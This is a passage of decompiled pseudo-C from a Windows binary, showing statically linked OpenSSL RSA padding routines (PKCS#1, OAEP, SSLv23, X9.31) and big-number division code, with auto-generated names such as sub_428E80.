  _DWORD *v7; // eax
  int *v8; // ecx
  int v9; // eax
  int v10; // eax
  int v11; // [esp+4h] [ebp-24h]
  int v12; // [esp+Ch] [ebp-1Ch] BYREF
  int v13; // [esp+10h] [ebp-18h]
  int *v14; // [esp+14h] [ebp-14h] BYREF
  int v15; // [esp+18h] [ebp-10h]
  int v16; // [esp+1Ch] [ebp-Ch]
  int v17; // [esp+20h] [ebp-8h]

  v11 = 0;
  if ( sub_416DB0((int)a2) )
    return 0;
  sub_420700(a3);
  v4 = (int **)sub_420790(a3);
  if ( v4 )
  {
    v5 = a1 + 1;
    if ( sub_4173E0(a1 + 6, a2) )
    {
      a1[9] = 0;
      sub_416880(&v14);
      v14 = &v12;
      v16 = 2;
      v17 = 0;
      *a1 = 32 * ((sub_416F90(a2) + 31) / 32);
      sub_417490(v5, 0);
      if ( sub_417640(v5, 64) )
      {
        v6 = *a2;
        v12 = **a2;
        v15 = v12 != 0;
        if ( (int)a2[1] <= 1 )
        {
          v13 = 0;
        }
        else
        {
          v13 = v6[1];
          if ( v13 )
            v15 = 2;
        }
        if ( sub_4211F0((void **)v4, v5, (int *)&v14, a3) && sub_437C10(v4, v4, 64) )
        {
          if ( sub_416DB0((int)v4) )
          {
            if ( (int)v4[2] < 1 )
              v7 = sub_4171F0((int)v4, 1);
            else
              v7 = v4;
            if ( v7 )
            {
              v8 = *v4;
              v4[3] = 0;
              *v8 = -1;
              (*v4)[1] = -1;
              v4[1] = (int *)2;
              goto LABEL_20;
            }
          }
          else if ( sub_438090((int *)v4, 1u) )
          {
LABEL_20:
            if ( sub_4299A0(v4, 0, v4, (int *)&v14, a3) )
            {
              if ( (int)v4[1] <= 0 )
                v9 = 0;
              else
                v9 = **v4;
              a1[16] = v9;
              if ( (int)v4[1] <= 1 )
                v10 = 0;
              else
                v10 = (*v4)[1];
              a1[17] = v10;
              sub_417490(v5, 0);
              if ( sub_417640(v5, 2 * *a1) )
              {
                if ( sub_4299A0(0, (int)v5, v5, a1 + 6, a3) )
                  v11 = 1;
              }
            }
          }
        }
      }
    }
  }
  sub_420750(a3);
  return v11;
}

//----- (00428820) --------------------------------------------------------
_DWORD *__cdecl sub_428820(_DWORD *a1, _DWORD *a2)
{
  if ( a1 != a2 )
  {
    if ( !sub_4173E0(a1 + 1, a2 + 1) || !sub_4173E0(a1 + 6, a2 + 6) || !sub_4173E0(a1 + 11, a2 + 11) )
      return 0;
    *a1 = *a2;
    a1[16] = a2[16];
    a1[17] = a2[17];
  }
  return a1;
}

//----- (00428890) --------------------------------------------------------
int __usercall sub_428890@<eax>(__m64 a1@<mm0>, unsigned int *a2, int *a3, int a4, int a5, int *a6)
{
  int v6; // esi
  int result; // eax
  int *v8; // eax
  unsigned int **v9; // esi
  int v10; // eax
  __int64 v11; // [esp-14h] [ebp-28h]
  int v12; // [esp+10h] [ebp-4h]

  v6 = *(_DWORD *)(a5 + 28);
  v12 = 0;
  if ( v6 <= 1 || a3[1] != v6 || *(_DWORD *)(a4 + 4) != v6 )
    goto LABEL_7;
  result = (int)sub_4173C0((int)a2, v6);
  if ( !result )
    return result;
  HIDWORD(v11) = *(_DWORD *)a4;
  LODWORD(v11) = *a3;
  if ( sub_442240(a1, *a2, v11, *(_DWORD *)(a5 + 24)) )
  {
    a2[3] = *(_DWORD *)(a4 + 12) ^ a3[3];
    a2[1] = v6;
    sub_416F60(a2);
    return 1;
  }
  else
  {
LABEL_7:
    sub_420700(a6);
    v8 = sub_420790(a6);
    v9 = (unsigned int **)v8;
    if ( v8 )
    {
      if ( a3 == (int *)a4 )
        v10 = sub_441C90(v8, a3, a6);
      else
        v10 = sub_421C20((unsigned int **)v8, (unsigned int **)a3, (unsigned int **)a4, a6);
      if ( v10 )
      {
        if ( sub_428330(a2, v9) )
          v12 = 1;
      }
    }
    sub_420750(a6);
    return v12;
  }
}

//----- (004289A0) --------------------------------------------------------
_DWORD *sub_4289A0()
{
  _DWORD *result; // eax
  _DWORD *v1; // esi

  result = sub_4133F0(0x4Cu);
  v1 = result;
  if ( result )
  {
    *result = 0;
    sub_416880(result + 1);
    sub_416880(v1 + 6);
    sub_416880(v1 + 11);
    v1[17] = 0;
    v1[16] = 0;
    v1[18] = 1;
    return v1;
  }
  return result;
}

//----- (00428A00) --------------------------------------------------------
_DWORD *__cdecl sub_428A00(_DWORD **a1, LPCRITICAL_SECTION lpCriticalSection, int **a3, int *a4)
{
  _DWORD *v4; // esi
  _DWORD *v6; // esi

  sub_414690(lpCriticalSection);
  v4 = *a1;
  sub_4146B0(lpCriticalSection);
  if ( !v4 )
  {
    v4 = sub_4289A0();
    if ( !v4 )
      return 0;
    if ( !sub_4285F0(v4, a3, a4) )
    {
      sub_4285A0(v4);
      return 0;
    }
    sub_414690(lpCriticalSection);
    if ( *a1 )
    {
      sub_4285A0(v4);
      v6 = *a1;
      sub_4146B0(lpCriticalSection);
      return v6;
    }
    *a1 = v4;
    sub_4146B0(lpCriticalSection);
  }
  return v4;
}

//----- (00428A90) --------------------------------------------------------
int __cdecl sub_428A90(void *a1, int a2, void *Src, int Size)
{
  if ( Size <= a2 )
  {
    if ( Size >= a2 )
    {
      memcpy(a1, Src, Size);
      return 1;
    }
    else
    {
      sub_408310(4, 107, 122, (int)"crypto\\rsa\\rsa_none.c", 23);
      return 0;
    }
  }
  else
  {
    sub_408310(4, 107, 110, (int)"crypto\\rsa\\rsa_none.c", 18);
    return 0;
  }
}

//----- (00428AF0) --------------------------------------------------------
int __cdecl sub_428AF0(char *a1, int a2, void *Src, int Size)
{
  if ( Size <= a2 )
  {
    memset(a1, 0, a2 - Size);
    memcpy(&a1[a2 - Size], Src, Size);
    return a2;
  }
  else
  {
    sub_408310(4, 111, 109, (int)"crypto\\rsa\\rsa_none.c", 36);
    return -1;
  }
}

//----- (00428B50) --------------------------------------------------------
int __cdecl sub_428B50(_BYTE *a1, int a2, void *Src, int Size)
{
  signed int v5; // edi
  _DWORD *v6; // esi
  signed int v7; // ebx
  _BYTE *v8; // esi

  if ( Size <= a2 - 11 )
  {
    *a1 = 0;
    v5 = a2 - Size - 11;
    a1[1] = 2;
    v6 = a1 + 2;
    if ( sub_406FF0() > 0 )
    {
      v7 = 0;
      if ( v5 <= 0 )
      {
LABEL_10:
        *v6 = 50529027;
        v6[1] = 50529027;
        v8 = v6 + 2;
        *v8 = 0;
        memcpy(v8 + 1, Src, Size);
        return 1;
      }
      else
      {
        while ( *(_BYTE *)v6 )
        {
LABEL_9:
          ++v7;
          v6 = (_DWORD *)((char *)v6 + 1);
          if ( v7 >= v5 )
            goto LABEL_10;
        }
        while ( sub_406FF0() > 0 )
        {
          if ( *(_BYTE *)v6 )
            goto LABEL_9;
        }
        return 0;
      }
    }
    else
    {
      return 0;
    }
  }
  else
  {
    sub_408310(4, 110, 110, (int)"crypto\\rsa\\rsa_ssl.c", 24);
    return 0;
  }
}

//----- (00428C00) --------------------------------------------------------
int __cdecl sub_428C00(void *a1, int a2, _BYTE *a3, int a4, int a5)
{
  _BYTE *v6; // edx
  int v7; // esi
  int i; // ecx
  int v10; // eax
  signed int v11; // esi

  if ( a4 >= 10 )
  {
    if ( a5 == a4 + 1 && (v6 = a3 + 1, *a3 == 2) )
    {
      v7 = a4 - 1;
      for ( i = 0; i < v7; ++i )
      {
        if ( !*v6++ )
          break;
      }
      if ( i == v7 || i < 8 )
      {
        sub_408310(4, 114, 113, (int)"crypto\\rsa\\rsa_ssl.c", 79);
        return -1;
      }
      else
      {
        v10 = -9;
        do
        {
          if ( v6[v10] != 3 )
            break;
          ++v10;
        }
        while ( v10 < -1 );
        if ( v10 == -1 )
        {
          sub_408310(4, 114, 115, (int)"crypto\\rsa\\rsa_ssl.c", 87);
          return -1;
        }
        else
        {
          v11 = -1 - i + v7;
          if ( v11 <= a2 )
          {
            memcpy(a1, v6, v11);
            return v11;
          }
          else
          {
            sub_408310(4, 114, 109, (int)"crypto\\rsa\\rsa_ssl.c", 94);
            return -1;
          }
        }
      }
    }
    else
    {
      sub_408310(4, 114, 107, (int)"crypto\\rsa\\rsa_ssl.c", 67);
      return -1;
    }
  }
  else
  {
    sub_408310(4, 114, 111, (int)"crypto\\rsa\\rsa_ssl.c", 63);
    return -1;
  }
}

//----- (00428D10) --------------------------------------------------------
int __cdecl sub_428D10(int a1, int a2, int a3, int a4, int a5)
{
  int *v5; // ebp
  int v6; // esi
  _BYTE **v7; // edi
  int v8; // ebx
  int v9; // ebp
  int v11; // [esp+14h] [ebp-54h]
  int v12; // [esp+1Ch] [ebp-4Ch]
  char Src[64]; // [esp+24h] [ebp-44h] BYREF

  v5 = (int *)a5;
  v6 = 0;
  v7 = (_BYTE **)sub_42B820();
  v11 = -1;
  if ( v7 )
  {
    v12 = sub_407480(a5);
    if ( v12 >= 0 )
    {
      v8 = 0;
      if ( a2 <= 0 )
      {
LABEL_15:
        v11 = 0;
      }
      else
      {
        while ( sub_42B860((int)v7, v5, 0) && sub_42BA10((int)v7) && sub_42BA10((int)v7) )
        {
          if ( v12 + v6 > a2 )
          {
            if ( !sub_42BA20(v7, (int)Src, 0) )
              break;
            v9 = a2;
            memcpy((void *)(v6 + a1), Src, a2 - v6);
            v6 = a2;
          }
          else
          {
            if ( !sub_42BA20(v7, v6 + a1, 0) )
              break;
            v6 += v12;
            v9 = a2;
          }
          ++v8;
          if ( v6 >= v9 )
            goto LABEL_15;
          v5 = (int *)a5;
        }
      }
    }
  }
  sub_42B840(v7);
  return v11;
}

//----- (00428E80) --------------------------------------------------------
int __cdecl sub_428E80(_BYTE *a1, int a2, const void *a3, int Size, int a5, int a6, char *a7, int a8)
{
  const char *v8; // eax
  int v9; // esi
  int v10; // edi
  int v12; // ebx
  _BYTE *v13; // ebp
  int v14; // edi
  _BYTE *v15; // eax
  _BYTE *v16; // eax
  int v17; // ecx
  _BYTE *v18; // eax
  char *v19; // [esp-18h] [ebp-84h]
  void *Block; // [esp+10h] [ebp-5Ch]
  _BYTE *Blocka; // [esp+10h] [ebp-5Ch]
  int v22; // [esp+14h] [ebp-58h]
  int *v23; // [esp+18h] [ebp-54h]
  char v24[64]; // [esp+28h] [ebp-44h] BYREF

  v8 = a7;
  v23 = (int *)a7;
  v22 = a8;
  Block = (void *)(a2 - 1);
  if ( !a7 )
  {
    v8 = sub_42BEA0();
    v23 = (int *)v8;
  }
  if ( !a8 )
    v22 = (int)v8;
  v9 = sub_407480((int)v8);
  v10 = a2 - 1 - 2 * v9;
  if ( Size > v10 - 1 )
  {
    sub_408310(4, 154, 110, (int)"crypto\\rsa\\rsa_oaep.c", 60);
    return 0;
  }
  if ( (int)Block < 2 * v9 + 1 )
  {
    sub_408310(4, 154, 120, (int)"crypto\\rsa\\rsa_oaep.c", 66);
    return 0;
  }
  *a1 = 0;
  v12 = (int)&a1[v9 + 1];
  if ( !sub_42BC10(a5, a6, v12, 0, v23, 0) )
    return 0;
  memset((void *)(v12 + v9), 0, v10 - Size - 1);
  v19 = &a1[a2 - Size];
  *(v19 - 1) = 1;
  memcpy(v19, a3, Size);
  v13 = a1 + 1;
  if ( sub_406FF0() <= 0 )
    return 0;
  v14 = (int)Block - v9;
  v15 = sub_4133F0((size_t)Block - v9);
  Blocka = v15;
  if ( !v15 )
  {
    sub_408310(4, 154, 65, (int)"crypto\\rsa\\rsa_oaep.c", 89);
    return 0;
  }
  if ( sub_428D10((int)v15, v14, (int)(a1 + 1), v9, v22) < 0 )
    return 0;
  if ( v14 > 0 )
  {
    v16 = &a1[v9 + 1];
    v17 = v14;
    do
    {
      *v16 ^= Blocka[(_DWORD)v16 - v12];
      ++v16;
      --v17;
    }
    while ( v17 );
    v13 = a1 + 1;
  }
  if ( sub_428D10((int)v24, v9, v12, v14, v22) < 0 )
    return 0;
  if ( v9 > 0 )
  {
    v18 = v13;
    do
    {
      *v18 ^= v18[v24 - v13];
      ++v18;
      --v9;
    }
    while ( v9 );
  }
  sub_413490(Blocka);
  return 1;
}

//----- (00429070) --------------------------------------------------------
int __cdecl sub_429070(void *a1, int a2, const void *a3, int a4, int Size, int a6, int a7, char *a8, int a9)
{
  const char *v9; // eax
  int v10; // eax
  signed int v11; // esi
  unsigned __int8 *v12; // eax
  unsigned __int8 *v13; // edi
  unsigned int v14; // ebp
  int i; // edi
  char *v16; // eax
  signed int v17; // ecx
  int v18; // eax
  int v19; // edi
  unsigned int v20; // ebp
  int v21; // ebx
  unsigned int v22; // edx
  int v23; // ebp
  signed int v24; // esi
  char *Block; // [esp+10h] [ebp-B0h]
  int *v27; // [esp+14h] [ebp-ACh]
  unsigned int j; // [esp+14h] [ebp-ACh]
  int v29; // [esp+18h] [ebp-A8h]
  int v30; // [esp+1Ch] [ebp-A4h]
  _BYTE *Src; // [esp+20h] [ebp-A0h]
  int v32; // [esp+24h] [ebp-9Ch]
  void *v33; // [esp+28h] [ebp-98h]
  int v34; // [esp+2Ch] [ebp-94h]
  int v35; // [esp+38h] [ebp-88h]
  char v36[64]; // [esp+3Ch] [ebp-84h] BYREF
  char v37[64]; // [esp+7Ch] [ebp-44h] BYREF

  v9 = a8;
  v27 = (int *)a8;
  v32 = a9;
  v30 = -1;
  v29 = 0;
  Block = 0;
  v33 = 0;
  if ( !a8 )
  {
    v9 = sub_42BEA0();
    v27 = (int *)v9;
  }
  if ( !a9 )
    v32 = (int)v9;
  v10 = sub_407480((int)v9);
  v34 = v10;
  if ( a2 > 0 && a4 > 0 )
  {
    if ( Size >= a4 && Size >= 2 * v10 + 2 )
    {
      v11 = Size - v10 - 1;
      Block = (char *)sub_4133F0(v11);
      v12 = (unsigned __int8 *)sub_4133F0(Size);
      v13 = v12;
      v33 = v12;
      if ( !Block || !v12 )
      {
        sub_408310(4, 153, 65, (int)"crypto\\rsa\\rsa_oaep.c", 156);
        goto LABEL_25;
      }
      memset(v12, 0, Size);
      memcpy(&v13[Size - a4], a3, a4);
      v14 = -(((unsigned int)*v13 - 1) >> 31);
      Src = v13 + 1;
      v35 = (int)&v13[v34 + 1];
      if ( sub_428D10((int)v36, v34, v35, v11, v32) )
        goto LABEL_25;
      for ( i = 0; i < v34; ++i )
        v36[i] ^= v36[i + Src - v36];
      if ( sub_428D10((int)Block, v11, (int)v36, v34, v32) )
        goto LABEL_25;
      if ( v11 > 0 )
      {
        v16 = Block;
        v17 = v11;
        do
        {
          *v16 ^= v16[v35 - (_DWORD)Block];
          ++v16;
          --v17;
        }
        while ( v17 );
      }
      if ( !sub_42BC10(a6, a7, (int)v37, 0, v27, 0) )
        goto LABEL_25;
      v18 = sub_413A50(Block, v37, v34);
      v19 = v34;
      v20 = -((v18 >= 0) & ((unsigned int)(v18 - 1) >> 31)) & v14;
      v21 = 0;
      for ( j = v20; v19 < v11; j = v20 )
      {
        v22 = -((((unsigned __int8)Block[v19] ^ 1u) - 1) >> 31);
        v23 = v22 & ~v21;
        v21 |= v22;
        v29 = v19 & v23 | v29 & ~v23;
        v20 = (v21 | -(((unsigned int)(unsigned __int8)Block[v19++] - 1) >> 31)) & j;
      }
      if ( (v21 & v20) != 0 )
      {
        v24 = v11 - (v29 + 1);
        v30 = v24;
        if ( a2 >= v24 )
        {
          memcpy(a1, &Block[v29 + 1], v24);
          goto LABEL_25;
        }
        sub_408310(4, 153, 109, (int)"crypto\\rsa\\rsa_oaep.c", 223);
        v30 = -1;
      }
    }
    sub_408310(4, 153, 121, (int)"crypto\\rsa\\rsa_oaep.c", 236);
LABEL_25:
    sub_413490(Block);
    sub_413490(v33);
    return v30;
  }
  return -1;
}
// 429070: using guessed type char var_84[64];

//----- (004293B0) --------------------------------------------------------
int __cdecl sub_4293B0(_BYTE *a1, int a2, const void *a3, int Size, int a5, int a6)
{
  return sub_428E80(a1, a2, a3, Size, a5, a6, 0, 0);
}

//----- (004293E0) --------------------------------------------------------
int __cdecl sub_4293E0(void *a1, int a2, const void *a3, int a4, int Size, int a6, int a7)
{
  return sub_429070(a1, a2, a3, a4, Size, a6, a7, 0, 0);
}

//----- (00429410) --------------------------------------------------------
int __cdecl sub_429410(_BYTE *a1, int a2, void *Src, int Size)
{
  _BYTE *v5; // esi

  if ( Size <= a2 - 11 )
  {
    *a1 = 0;
    a1[1] = 1;
    memset(a1 + 2, 255, a2 - Size - 3);
    v5 = &a1[a2 - Size - 1];
    *v5 = 0;
    memcpy(v5 + 1, Src, Size);
    return 1;
  }
  else
  {
    sub_408310(4, 108, 110, (int)"crypto\\rsa\\rsa_pk1.c", 26);
    return 0;
  }
}

//----- (00429480) --------------------------------------------------------
int __cdecl sub_429480(void *a1, int a2, char *a3, int a4, int a5)
{
  char *v5; // ecx
  int v6; // eax
  char v8; // dl
  _BYTE *v9; // ecx
  int v10; // esi
  int v11; // eax
  signed int v12; // esi

  v5 = a3;
  if ( a5 < 11 )
    return -1;
  v6 = a4;
  if ( a5 == a4 )
  {
    v5 = a3 + 1;
    if ( *a3 )
    {
      sub_408310(4, 112, 138, (int)"crypto\\rsa\\rsa_pk1.c", 67);
      return -1;
    }
    v6 = a4 - 1;
  }
  if ( a5 != v6 + 1 || (v8 = *v5, v9 = v5 + 1, v8 != 1) )
  {
    sub_408310(4, 112, 106, (int)"crypto\\rsa\\rsa_pk1.c", 75);
    return -1;
  }
  v10 = v6 - 1;
  v11 = 0;
  if ( v10 > 0 )
  {
    while ( *v9 == 0xFF )
    {
      ++v11;
      ++v9;
      if ( v11 >= v10 )
        goto LABEL_11;
    }
    if ( *v9 )
    {
      sub_408310(4, 112, 102, (int)"crypto\\rsa\\rsa_pk1.c", 88);
      return -1;
    }
    ++v9;
  }
LABEL_11:
  if ( v11 == v10 )
  {
    sub_408310(4, 112, 113, (int)"crypto\\rsa\\rsa_pk1.c", 97);
    return -1;
  }
  else if ( v11 >= 8 )
  {
    v12 = -1 - v11 + v10;
    if ( v12 <= a2 )
    {
      memcpy(a1, v9, v12);
      return v12;
    }
    else
    {
      sub_408310(4, 112, 109, (int)"crypto\\rsa\\rsa_pk1.c", 109);
      return -1;
    }
  }
  else
  {
    sub_408310(4, 112, 103, (int)"crypto\\rsa\\rsa_pk1.c", 103);
    return -1;
  }
}

//----- (004295A0) --------------------------------------------------------
int __cdecl sub_4295A0(_BYTE *a1, int a2, void *Src, int Size)
{
  signed int v5; // edi
  _BYTE *v6; // esi
  signed int v7; // ebx

  if ( Size <= a2 - 11 )
  {
    *a1 = 0;
    v5 = a2 - Size - 3;
    a1[1] = 2;
    v6 = a1 + 2;
    if ( sub_406FF0() > 0 )
    {
      v7 = 0;
      if ( v5 <= 0 )
      {
LABEL_10:
        *v6 = 0;
        memcpy(v6 + 1, Src, Size);
        return 1;
      }
      else
      {
        while ( *v6 )
        {
LABEL_9:
          ++v7;
          ++v6;
          if ( v7 >= v5 )
            goto LABEL_10;
        }
        while ( sub_406FF0() > 0 )
        {
          if ( *v6 )
            goto LABEL_9;
        }
        return 0;
      }
    }
    else
    {
      return 0;
    }
  }
  else
  {
    sub_408310(4, 109, 110, (int)"crypto\\rsa\\rsa_pk1.c", 125);
    return 0;
  }
}

//----- (00429650) --------------------------------------------------------
size_t __cdecl sub_429650(void *a1, int a2, void *Src, int Size, int a5)
{
  unsigned __int8 *v5; // edi
  size_t v6; // ebp
  signed int v8; // edx
  int v9; // eax
  unsigned int v10; // ecx
  int v11; // ebp
  int v12; // [esp+Ch] [ebp-8h]
  int v13; // [esp+10h] [ebp-4h]

  v5 = 0;
  v6 = -1;
  v13 = 0;
  if ( a2 < 0 || Size < 0 )
    return -1;
  if ( Size <= a5 && a5 >= 11 )
  {
    v5 = (unsigned __int8 *)sub_413430(a5);
    if ( !v5 )
    {
      sub_408310(4, 113, 65, (int)"crypto\\rsa\\rsa_pk1.c", 180);
      return -1;
    }
    memcpy(&v5[a5 - Size], Src, Size);
    v8 = 2;
    v12 = 0;
    do
    {
      v9 = v12;
      v10 = -(((unsigned int)v5[v8] - 1) >> 31);
      v12 |= v10;
      v11 = v8++ & v10 & ~v9 | v13 & ~(v10 & ~v9);
      v13 = v11;
    }
    while ( v8 < a5 );
    v6 = a5 - (v11 + 1);
    if ( ((((v13 ^ (v13 | (unsigned int)(v13 - 10))) >> 31) - 1) & (((a2 ^ (a2 ^ v6 | v6 ^ (a2 - v6))) >> 31) - 1) & -(((unsigned int)*v5 - 1) >> 31) & -(((v5[1] ^ 2u) - 1) >> 31)) != 0 )
      memcpy(a1, &v5[v13 + 1], v6);
    else
      v6 = -1;
  }
  sub_413490(v5);
  if ( v6 == -1 )
    sub_408310(4, 113, 159, (int)"crypto\\rsa\\rsa_pk1.c", 243);
  return v6;
}
// 42971B: conditional instruction was optimized away because %arg_10.4>=B

//----- (004297F0) --------------------------------------------------------
int __cdecl sub_4297F0(_BYTE *a1, int a2, void *Src, size_t Size)
{
  signed int v4; // edi
  _BYTE *v6; // esi

  v4 = a2 - Size - 2;
  if ( v4 >= 0 )
  {
    v6 = a1 + 1;
    if ( a2 - Size == 2 )
    {
      *a1 = 106;
    }
    else
    {
      *a1 = 107;
      if ( v4 > 1 )
      {
        memset(v6, 187, a2 - Size - 3);
        v6 = &a1[v4];
      }
      *v6++ = -70;
    }
    memcpy(v6, Src, Size);
    v6[Size] = -52;
    return 1;
  }
  else
  {
    sub_408310(4, 127, 110, (int)"crypto\\rsa\\rsa_x931.c", 30);
    return -1;
  }
}

//----- (00429870) --------------------------------------------------------
size_t __cdecl sub_429870(void *a1, int a2, char *a3, int a4, int a5)
{
  char v5; // al
  char *v6; // edx
  int v7; // esi
  int i; // ecx
  char v9; // al
  size_t v10; // esi

  if ( a5 == a4 && ((v5 = *a3, *a3 == 106) || v5 == 107) )
  {
    v6 = a3 + 1;
    if ( v5 == 107 )
    {
      v7 = a4 - 3;
      for ( i = 0; i < v7; ++i )
      {
        v9 = *v6++;
        if ( v9 == -70 )
          break;
        if ( v9 != -69 )
        {
          sub_408310(4, 128, 138, (int)"crypto\\rsa\\rsa_x931.c", 72);
          return -1;
        }
      }
      v10 = v7 - i;
      if ( !i )
      {
        sub_408310(4, 128, 138, (int)"crypto\\rsa\\rsa_x931.c", 80);
        return -1;
      }
    }
    else
    {
      v10 = a4 - 2;
    }
    if ( v6[v10] == -52 )
    {
      memcpy(a1, v6, v10);
      return v10;
    }
    else
    {
      sub_408310(4, 128, 139, (int)"crypto\\rsa\\rsa_x931.c", 88);
      return -1;
    }
  }
  else
  {
    sub_408310(4, 128, 137, (int)"crypto\\rsa\\rsa_x931.c", 61);
    return -1;
  }
}

//----- (00429960) --------------------------------------------------------
int __cdecl sub_429960(int a1)
{
  if ( a1 <= 673 )
  {
    switch ( a1 )
    {
      case 673:
        return 54;
      case 64:
        return 51;
      case 672:
        return 52;
    }
    return -1;
  }
  if ( a1 != 674 )
    return -1;
  return 53;
}

//----- (004299A0) --------------------------------------------------------
int __cdecl sub_4299A0(_DWORD *a1, int a2, _DWORD *a3, int *a4, int *a5)
{
  int v5; // eax
  int v6; // eax
  int *v8; // ebx
  unsigned int **v9; // esi
  unsigned int **v10; // edi
  int *v11; // ebp
  _DWORD *v12; // eax
  int v13; // esi
  int v14; // eax
  unsigned int *v15; // ecx
  int i; // eax
  int v17; // ebx
  unsigned int *v18; // eax
  int v19; // esi
  _DWORD *v20; // eax
  int v21; // esi
  unsigned int v22; // eax
  unsigned int v23; // edi
  unsigned int v24; // esi
  unsigned int v25; // edi
  unsigned __int64 v26; // rax
  bool v27; // zf
  int v28; // ebx
  _DWORD *v29; // [esp+8h] [ebp-4Ch]
  _DWORD *v30; // [esp+Ch] [ebp-48h]
  _DWORD *v31; // [esp+Ch] [ebp-48h]
  unsigned int *v32; // [esp+10h] [ebp-44h]
  int v33; // [esp+14h] [ebp-40h]
  unsigned int v34; // [esp+18h] [ebp-3Ch]
  unsigned int v35; // [esp+1Ch] [ebp-38h]
  int *v36; // [esp+20h] [ebp-34h]
  int v37; // [esp+24h] [ebp-30h]
  unsigned int **v38; // [esp+28h] [ebp-2Ch]
  int v39; // [esp+2Ch] [ebp-28h]
  unsigned int **v40; // [esp+30h] [ebp-24h]
  int v41; // [esp+34h] [ebp-20h]
  int v42; // [esp+38h] [ebp-1Ch]
  int *v43[5]; // [esp+40h] [ebp-14h] BYREF

  v5 = a3[1];
  v33 = 0;
  if ( v5 > 0 && !*(_DWORD *)(*a3 + 4 * v5 - 4) || (v6 = a4[1], v6 > 0) && !*(_DWORD *)(*a4 + 4 * v6 - 4) )
  {
    sub_408310(3, 107, 107, (int)"crypto\\bn\\bn_div.c", 157);
    return 0;
  }
  if ( sub_416F30((int)a3, 4) || sub_416F30((int)a4, 4) )
    v33 = 1;
  if ( sub_416DB0((int)a4) )
  {
    sub_408310(3, 107, 103, (int)"crypto\\bn\\bn_div.c", 179);
    return 0;
  }
  if ( v33 || sub_416960(a3, a4) >= 0 )
  {
    v8 = a5;
    sub_420700(a5);
    v9 = (unsigned int **)sub_420790(a5);
    v38 = v9;
    v10 = (unsigned int **)sub_420790(a5);
    v40 = v10;
    v11 = sub_420790(a5);
    v12 = a1;
    v36 = v11;
    if ( !a1 )
      v12 = sub_420790(a5);
    v29 = v12;
    if ( !v11 )
      goto LABEL_68;
    if ( !v12 )
      goto LABEL_68;
    if ( !v9 )
      goto LABEL_68;
    if ( !v10 )
      goto LABEL_68;
    v13 = 32 - sub_416F90(a4) % 32;
    if ( !sub_437C10(v11, a4, v13) )
      goto LABEL_68;
    v11[3] = 0;
    v41 = v13 + 32;
    if ( !sub_437C10(v10, a3, v13 + 32) )
      goto LABEL_68;
    v10[3] = 0;
    if ( v33 )
    {
      v14 = v11[1];
      v15 = v10[1];
      if ( (int)v15 > v14 + 1 )
      {
        if ( !sub_4173C0((int)v10, (int)v15 + 1) )
          goto LABEL_68;
        (*v10)[(_DWORD)v10[1]] = 0;
        v10[1] = (unsigned int *)((char *)v10[1] + 1);
      }
      else
      {
        if ( !sub_4173C0((int)v10, v14 + 2) )
          goto LABEL_68;
        for ( i = (int)v10[1]; i < v11[1] + 2; ++i )
          (*v10)[i] = 0;
        v10[1] = (unsigned int *)(v11[1] + 2);
      }
    }
    v17 = v11[1];
    v18 = v10[1];
    v19 = (int)v18 - v17;
    v43[3] = 0;
    v43[0] = (int *)&(*v10)[(_DWORD)v18 - v17];
    v43[1] = (int *)v17;
    v43[2] = (int *)((char *)v10[2] - ((char *)v18 - v17));
    v37 = v17;
    v34 = *(_DWORD *)(*v11 + 4 * v17 - 4);
    if ( v17 == 1 )
      v35 = 0;
    else
      v35 = *(_DWORD *)(*v11 + 4 * v17 - 8);
    v32 = &(*v10)[(_DWORD)v18 - 1];
    v29[3] = a3[3] ^ a4[3];
    if ( sub_4173C0((int)v29, v19 + 1) )
    {
      v29[1] = v19 - v33;
      v30 = (_DWORD *)(*v29 + 4 * v19 - 4);
      if ( sub_4173C0((int)v38, v17 + 1) )
      {
        if ( !v33 )
        {
          if ( sub_416960(v43, v11) < 0 )
          {
            v20 = v29;
            --v29[1];
            goto LABEL_44;
          }
          sub_438990(v43[0], v43[0], (unsigned int *)*v11, v17);
          *v30 = 1;
        }
        v20 = v29;
LABEL_44:
        v31 = v30 + 1;
        if ( v20[1] )
          --v31;
        else
          v20[3] = 0;
        v21 = v19 - 1;
        if ( v21 > 0 )
        {
          v39 = v21;
          do
          {
            v22 = *v32;
            v23 = *(v32 - 1);
            if ( *v32 == v34 )
            {
              v24 = -1;
            }
            else
            {
              v24 = __PAIR64__(v22, v23) / v34;
              v25 = __PAIR64__(v22, v23) % v34;
              v26 = v24 * (unsigned __int64)v35;
              v42 = v24 * v35;
              if ( v26 > __PAIR64__(v25, *(v32 - 2)) )
              {
                do
                {
                  v25 += v34;
                  --v24;
                  if ( v25 < v34 )
                    break;
                  HIDWORD(v26) = (__PAIR64__(HIDWORD(v26), v42) - v35) >> 32;
                  v42 -= v35;
                }
                while ( __PAIR64__(HIDWORD(v26), v42) > __PAIR64__(v25, *(v32 - 2)) );
              }
              v11 = v36;
              v17 = v37;
            }
            (*v38)[v17] = sub_4384B0(*v38, (unsigned int *)*v11, v17, v24);
            --v43[0];
            if ( sub_438990(v43[0], v43[0], *v38, v17 + 1) )
            {
              --v24;
              if ( sub_4387D0(v43[0], (unsigned int *)v43[0], (unsigned int *)*v11, v17) )
                ++*v32;
            }
            v27 = v39-- == 1;
            *--v31 = v24;
            --v32;
          }
          while ( !v27 );
          v10 = v40;
        }
        sub_416F60(v10);
        if ( a2 )
        {
          v28 = a3[3];
          sub_437D40((unsigned int **)a2, v10, v41);
          if ( !sub_416DB0(a2) )
            *(_DWORD *)(a2 + 12) = v28;
        }
        if ( v33 )
          sub_416F60(v29);
        sub_420750(a5);
        return 1;
      }
    }
    v8 = a5;
LABEL_68:
    sub_420750(v8);
    return 0;
  }
  if ( a2 && !sub_4173E0((_DWORD *)a2, a3) )
    return 0;
  if ( a1 )
    sub_417490(a1, 0);
  return 1;
}

//----- (00429EA0) --------------------------------------------------------
_DWORD *__cdecl sub_429EA0(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = 0;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  a1[4] = 0;
  a1[6] = 0;
  a1[7] = 0;
  a1[8] = 0;
  a1[11] = 0;
  a1[12] = 0;
  a1[13] = 0;
  a1[14] = 0;
  a1[15] = 0;
  a1[16] = 0;
  a1[18] = 0;
  a1[19] = 0;
  return result;
}

//----- (00429EE0) --------------------------------------------------------
int __cdecl sub_429EE0(volatile LONG *Block, int a2)
{
  volatile LONG *v2; // esi
  void (__cdecl *v3)(volatile LONG *); // eax

  v2 = Block;
  if ( Block )
  {
    if ( a2 )
    {
      sub_4147E0(Block + 20, -1, &Block);
    }
    else
    {
      --*((_DWORD *)Block + 20);
